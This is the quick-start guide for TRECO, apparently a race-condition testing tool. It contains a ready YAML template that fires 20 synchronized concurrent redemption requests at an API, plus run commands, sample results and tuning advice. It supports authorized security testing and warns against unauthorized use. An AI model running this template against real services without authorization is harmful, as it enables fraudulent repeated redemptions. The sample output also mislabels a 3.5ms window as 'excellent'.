Quick Start
===========

This guide will help you run your first race condition test with TRECO in 5 minutes.

Your First Attack
-----------------

Let's test a simple double-redemption vulnerability.

1. Create Attack Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Create a file called ``attack.yaml``:

.. code-block:: yaml

   metadata:
     name: "Double Redemption Test"
     version: "1.0"
     vulnerability: "CWE-362"

   config:
     host: "api.example.com"
     port: 443
     tls:
       enabled: true
       verify_cert: true

   entrypoints:
     - state: login
       input:
         username: "testuser"
         password: "testpass"

   states:
     login:
       description: "Authenticate and get token"
       request: |
         POST /api/login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"username": "{{ username }}", "password": "{{ password }}"}
       
       extract:
         token:
           type: jpath
           pattern: "$.access_token"
       
       next:
         - on_status: 200
           goto: race_attack

     race_attack:
       description: "Concurrent redemption attack"
       request: |
         POST /api/redeem HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.token }}
         Content-Type: application/json
         
         {"amount": 100}
       
       race:
         threads: 20
         sync_mechanism: barrier
         connection_strategy: preconnect
         thread_propagation: single
       
       next:
         - on_status: 200
           goto: end

     end:
       description: "Attack complete"

2. Run the Attack
~~~~~~~~~~~~~~~~~

.. code-block:: bash

   # Using uv run
   uv run treco attack.yaml

   # Or activate the environment first
   source .venv/bin/activate
   treco attack.yaml

3. Analyze the Results
~~~~~~~~~~~~~~~~~~~~~~

TRECO will output detailed results:

.. code-block:: text

   ======================================================================
   RACE ATTACK: race_attack
   ======================================================================
   Threads: 20
   Sync Mechanism: barrier
   Connection Strategy: preconnect
   ======================================================================

   [Thread 0] Status: 200, Time: 45.2ms
   [Thread 1] Status: 200, Time: 45.8ms
   [Thread 2] Status: 200, Time: 46.1ms
   ...

   ======================================================================
   RACE ATTACK RESULTS
   ======================================================================
   Total threads: 20
   Successful: 18 (90%)
   Failed: 2 (10%)

   Timing Analysis:
     Average response time: 46.5ms
     Fastest response: 45.2ms
     Slowest response: 48.7ms
     Race window: 3.5ms
     ✓ EXCELLENT race window (< 1ms expected, got 3.5ms)

   Vulnerability Assessment:
     ⚠ VULNERABLE: Multiple requests succeeded (18/20)
     ⚠ Potential race condition detected!
   ======================================================================

Understanding the Output
------------------------

Race Window
~~~~~~~~~~~

The **race window** is the time difference between the fastest and slowest response:

* **< 1ms**: Excellent - true race condition achievable
* **1-100ms**: Good - sufficient precision for most tests
* **> 100ms**: Poor - timing too imprecise

Vulnerability Assessment
~~~~~~~~~~~~~~~~~~~~~~~~

* **Multiple successes**: Indicates race condition vulnerability
* **Single success**: Normal behavior (only first should succeed)
* **All failures**: No vulnerability detected

Common CLI Options
------------------

Override Configuration
~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: bash

   # Override credentials
   treco attack.yaml --user alice --password secret

   # Override target
   treco attack.yaml --host api.example.com --port 443

   # Override thread count
   treco attack.yaml --threads 50

Verbose Output
~~~~~~~~~~~~~~

.. code-block:: bash

   # Show detailed debug information
   treco attack.yaml --verbose

   # Show only errors
   treco attack.yaml --quiet

What's Next?
------------

* :doc:`installation` - Complete installation guide
* `GitHub Repository <https://github.com/maycon/TRECO>`_ - More examples and source code
* `GitHub Issues <https://github.com/maycon/TRECO/issues>`_ - Report bugs or request features

Testing Your Own API
---------------------

To test your own API:

1. Replace ``api.example.com`` with your target
2. Update the authentication endpoint and credentials
3. Replace the attack endpoint (``/api/redeem``)
4. Adjust the ``threads`` count (10-30 is usually optimal)
5. Run the attack and analyze the results

.. warning::

   Only test APIs you have **written authorization** to test.
   Unauthorized testing is illegal and unethical.

Troubleshooting
---------------

Attack Not Working?
~~~~~~~~~~~~~~~~~~~

1. **Check authentication**: Ensure login returns a valid token
2. **Verify endpoint**: Use a tool like Postman to test the endpoint manually
3. **Adjust timing**: Try different ``sync_mechanism`` values
4. **Reduce threads**: Start with 5-10 threads and increase gradually

Poor Race Window?
~~~~~~~~~~~~~~~~~

1. **Use preconnect**: Ensure ``connection_strategy: preconnect``
2. **Use barrier**: Set ``sync_mechanism: barrier``
3. **Check network**: Test on the same network as the target
4. **Reduce threads**: Too many threads can increase variance

Connection Errors?
~~~~~~~~~~~~~~~~~~

1. **SSL/TLS**: Try ``verify_cert: false`` for self-signed certificates
2. **Timeout**: Increase timeout in configuration
3. **Firewall**: Ensure target allows your connections
4. **Rate limiting**: Reduce thread count if being rate limited
